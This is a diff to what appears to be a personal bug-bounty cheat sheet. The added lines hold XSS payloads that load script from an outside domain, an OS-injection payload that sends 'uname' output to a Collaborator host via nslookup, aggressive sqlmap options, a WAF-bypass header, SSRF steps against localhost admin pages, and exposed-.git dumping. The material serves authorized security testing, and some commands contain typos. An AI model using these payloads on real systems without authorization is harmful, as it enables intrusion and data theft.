@@ -6,7 +6,19 @@ https://www.bugbountyhunting.com
 
 [Search for: Tips- Write-ups - Payloads - and more]
 
+https://dencode.com/en/
+
+[encode and decode]
+
 https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/
+
+https://xplo1t-sec.github.io/bugbounty-lookup/
+
+[find VDPs]
+
+https://bugboard.rsecloud.com/
+
+[bug-bounty report]
 
 https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
 
@@ -91,6 +103,10 @@ https://cheatsheet.haax.fr/web-pentest/files-and-files-inclusions/xxe/
 https://portswigger.net/web-security/sql-injection/cheat-sheet
 [SQL cheat sheet]
 
+https://acorzo1983.github.io/SQLMapCG/
+
+[SQL command generator]
+
 sudo pip3 install -r requirements.txt
 sudo python3 [setup.py](http://setup.py/) install
 
@@ -108,6 +124,8 @@ OR
 
 sudo pip3 install -r requirements.txt --break-system-packages
 ```
+
+python3 -m pip install --break-system-packages -r requirements.txt
 
 [Fix pip requirement issue]
 
@@ -268,7 +286,7 @@ datasources:
 
 [subdomain bruteforcing using dns]
 
-[+] cat new_tel.txt | httpx -o probe.txt -title
+[+] cat new_tel.txt | httpx -o probe.txt -title -sc -location -td -cdn
 
 - cat new_tel.txt | httprobe -o probe.txt -c 20
 
@@ -523,6 +541,8 @@ curl -H "Origin: https://malicious.com" -I https://vulnerable-site.com
 
 #SQL 
 
+[+] sqlmap -r sqli.req --technique=BEUSTQ --level=5 --risk=3 –batch [sqlmap test with request file]
+
 [+] - - comments out SQL query 
 
 [+] -v 3 - - TO SEE PAYLOAD BLOCKED BY WAF
@@ -676,10 +696,12 @@ curl -H "Origin: https://malicious.com" -I https://vulnerable-site.com
 - paste url in browser you should be logged in as admin
 
 #OS INJECTION
-[+] ";uname"/";pwd" right inline/front of a parameter or endpoint
+[+] ";uname" OR ";pwd" right inline or in front of a parameter or endpoint
 [+] Check Submit Feedback and test email with ";sleep+5;"
 
 - or use "||sleep+5||"
+
+[+] Use burp collaborator with parameter like < =||nslookup ‘uname’.collab_url.com|| >
 
 #XSS
 
@@ -707,6 +729,15 @@ N.B - if code search word reflects in HTML code/response and in the URL it is RX
 
 [+] Test  >'<"//:=;!- - 
 
+[+] Content-Encoding: WAFBYPASS 
+
+[use header when faced with 403 WAF] 
+
+[+] Improve your #XSS reports! 🔥
+Use our https://X55.is ✨ domain
+✅ Replacing alert(1)'-import('//X55.is')-'<Svg OnLoad=import('//X55.is')>
+✅ As href/src attribute<Base Href=//X55.is><Script Src=//X55.is>
+
 [+] <Img Src=OnXSS OnError=confirm(1)> 
 
 - <a aa aaa aaaa aaaaaa href=j&#97v&#97script&#x3A;&#97lert(document.cookie)>ClickMe
@@ -720,9 +751,9 @@ N.B - if code search word reflects in HTML code/response and in the URL it is RX
 
 [+] </script>'"><img src=x onError=prompt(1)>
 
-[+] `'>+<script>alert()</script>`
-
 [+] <script>alert(1)<! –
+
+[+] `'>+<script>alert()</script>`
 
 [+] <a onmouseover"alert(1)">test</a>
 
@@ -776,6 +807,11 @@ N.B - if code search word reflects in HTML code/response and in the URL it is RX
 [bypass hardcoded file upload]
 
 #SSRF
+
+N.B: take note of every endpoint that takes URL parameter
+
+- Test endpoints with Open Redirect to be sure it takes URL parameter
+
 [+] INTERCEPT the check stock option, check for the STOCK API(mostly URL encoded so highlight it and right click convert/URL/decode)
 
 - test the functionality of the stockAPI request section by changing it to "=http://localhost/" then URL encode this because the WA initiatlly did this
@@ -783,8 +819,10 @@ N.B - if code search word reflects in HTML code/response and in the URL it is RX
 - copy ADMIN page URL loaded within the site and INTERCEPT "checkstock" again
 - paste/check the destination of admin panel and paste in stockAPI "http://localhost/admin"
 - interecept checkstock again and copy URL to delete/whatever action to perform and paste in stockAPI ENCODE & DECODE
-- Do not remove interception till youre done on admin page because of WAF -- SSRF with lacal server
+- Do not remove interception till you're done on admin page because of WAF -- SSRF with local server
+
 [+] Test "check stock" option
+
 - decode the URL and check where the IP hosting the web server, test the IP by changing its value
 - send request to intruder, clear $ signs, add $last_no_in_IP$
 - PAYLOAD TYPE:number, FROM:1, TO: 254, STEP: 1, start attack
@@ -840,7 +878,18 @@ N.B - if code search word reflects in HTML code/response and in the URL it is RX
 
 [+] Test header with new <!DOCTYPE> XML entity then add the call function to the XML body 
 
-[+] 
+#INFORMATION DISCLOSURE 
+
+[+] Check if you can access /.git on website URL
+
+- get -r <URL.com/.git> and cd into the downloaded git path
+- git log to check out important logs and note commit id
+- git checkout <commit_id>
+
+[+] Authorization via information disclosure
+
+- Check /admin with TRACE request
+- Add X-Custom-IP-Aurhorization: 127.0.0.1
 
 ---
 
